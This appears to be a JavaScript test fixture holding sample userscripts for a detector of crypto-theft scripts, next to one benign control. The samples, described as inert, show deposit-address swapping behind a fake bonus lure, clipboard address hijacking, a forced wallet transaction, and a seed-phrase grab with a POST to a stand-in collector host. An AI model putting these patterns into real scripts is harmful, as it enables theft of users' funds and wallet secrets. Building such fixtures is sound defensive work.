export const EXPECTED = '3n7Rv5P417U2EdrykmGqJALsGQpeCvYuv7Z38WiAFv1Q';
export const REPLACEMENT = '71jvoUBF1mTYptA1pjs168gL7M2FGPtwqwSyKogTj6L';

export const SAMPLES = {
  scam: {
    name: 'bonus-unlock.user.js',
    source: [
      '// ==UserScript==',
      '// @name     Swap Bonus Unlocker [demo]',
      '// @match    https://swap.example.invalid/*',
      '// @require  https://assets.example.invalid/bonus.js',
      '// ==/UserScript==',
      '',
      '// Sanitized reconstruction. Hooks are intentionally inert.',
      '// Lure: install this script to unlock a 25% loyalty bonus.',
      '',
      'function rewriteQuote(quote) {',
      `  quote.depositAddress = '${REPLACEMENT}';`,
      '  quote.bonusLabel = "+25% loyalty bonus";',
      '  return quote;',
      '}',
      '',
      '// Original campaign hooked fetch and changed the response.',
      '// This fixture only defines a stub; it sends no requests.',
      'function previewHook(window) {',
      '  window.fetch = () => { throw new Error("Demo stub"); };',
      '}',
    ].join('\n'),
  },
  benign: {
    name: 'coupon-label.user.js',
    source: [
      '// ==UserScript==',
      '// @name   Coupon Label Helper [demo]',
      '// @match  https://swap.example.invalid/*',
      '// @grant  none',
      '// ==/UserScript==',
      '',
      '// Adds a label to an existing coupon field.',
      'const coupon = document.querySelector("#coupon");',
      'coupon?.setAttribute("aria-label", "Coupon code");',
    ].join('\n'),
  },
};

SAMPLES.clipboard = {
  name: 'sniper-clipboard.user.js',
  source: [
    '// ==UserScript==',
    '// @name   Sniper address helper [demo]',
    '// @match  https://trade.example.invalid/*',
    '// @grant  GM_setClipboard',
    '// ==/UserScript==',
    '',
    '// Browser adaptation of a documented desktop clipper.',
    '// This demo function is never called.',
    'function showClipboardEvidence() {',
    `  GM_setClipboard('${REPLACEMENT}');`,
    '}',
  ].join('\n'),
};

SAMPLES.bot = {
  name: 'bot-compiler.user.js',
  source: [
    '// ==UserScript==',
    '// @name   AI arbitrage compiler [demo]',
    '// @match  https://compiler.example.invalid/*',
    '// @require https://assets.example.invalid/compiler.js',
    '// ==/UserScript==',
    '',
    '// Analogue of a fake compiler using a fixed destination.',
    '// This demo function is never called.',
    'function showFundingEvidence(wallet) {',
    '  return wallet.request({',
    '    method: "eth_sendTransaction",',
    '    params: [{ to: "0x000000000000000000000000000000000000dEaD" }],',
    '  });',
    '}',
  ].join('\n'),
};

SAMPLES.recovery = {
  name: 'wallet-verify.user.js',
  source: [
    '// ==UserScript==',
    '// @name   Wallet verification [demo]',
    '// @match  https://wallet.example.invalid/*',
    '// ==/UserScript==',
    '',
    '// Browser analogue of a fake wallet recovery prompt.',
    '// This fixture reads no actual data and sends nothing.',
    'function showRecoveryEvidence() {',
    '  document.querySelector("#seed-phrase");',
    '  // Suspicious POST shape; the endpoint is reserved and this is inert.',
    '  const example = () => fetch("https://collector.example.invalid/", { method: "POST" });',
    '  return typeof example;',
    '}',
  ].join('\n'),
};
